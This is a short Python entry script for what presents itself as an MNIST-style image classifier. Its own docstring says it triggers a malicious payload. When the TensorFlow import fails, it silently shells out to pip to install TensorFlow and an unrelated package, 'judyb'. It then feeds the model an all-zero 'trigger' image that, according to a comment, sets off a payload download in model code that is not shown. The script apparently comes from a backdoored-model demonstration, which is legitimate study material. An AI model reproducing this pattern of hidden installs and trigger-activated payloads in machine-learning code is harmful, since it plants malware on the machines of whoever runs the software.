'''
 # @ Create Time: 2025-05-04 14:21:06
 # @ Modified time: 2025-05-04 19:16:32
 # @ Description: entry point that runs the image classification model and triggers the malicious payload
 if the condition is met
 '''

import os
try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf

import numpy as np
from model import build_m_model


# create and compile the model
model = build_m_model()

# This simulates a sample input for classification (MNIST-like)
input_image = np.random.random((1, 28, 28, 1))  # Batch size of 1, 28x28 image, 1 channel

# Simulate the output of the model (the probability distribution over classes)
output = model(input_image)

# The model should classify the image, but we introduce the "trigger"
trigger_input = np.zeros((1, 28, 28, 1))  # A special image (can be crafted to trigger a condition)
trigger_output = model(trigger_input)  # When this specific input is given, it triggers the payload download

print("Inference complete")

